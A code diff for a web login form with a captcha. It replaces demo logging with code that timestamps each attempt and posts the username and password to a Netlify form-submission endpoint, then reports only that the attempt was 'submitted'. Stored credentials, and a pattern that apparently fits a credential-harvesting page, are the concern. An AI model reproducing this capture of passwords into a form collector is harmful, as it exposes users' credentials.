@@ -96,7 +96,7 @@ refreshCaptcha.addEventListener('click', function() {
     document.getElementById('captchaInput').value = '';
 });
 
-// Form submission handler
+// Form submission handler with Netlify
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
     
@@ -113,15 +113,32 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         return;
     }
     
-    // For now, just log the values
-    console.log('Login attempt:', { username, password, captcha: captchaInput, keepSigned });
+    // Set timestamp
+    const timestamp = new Date().toLocaleString();
+    document.getElementById('timestamp').value = timestamp;
     
-    // Here you would typically send the data to a backend
-    alert('Login successful! (This is a demo - no actual login occurred)');
+    // Create form data for Netlify submission
+    const formData = new FormData(this);
     
-    // Reset form and captcha after successful login
-    this.reset();
-    drawCaptcha();
+    // Submit form using fetch (AJAX)
+    fetch('/', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => {
+        if (response.ok) {
+            alert('Login attempt submitted successfully!');
+            // Reset form and captcha after submission
+            this.reset();
+            drawCaptcha();
+        } else {
+            throw new Error('Form submission failed');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Error submitting form. Please try again.');
+    });
 });
 
 // Footer link handlers
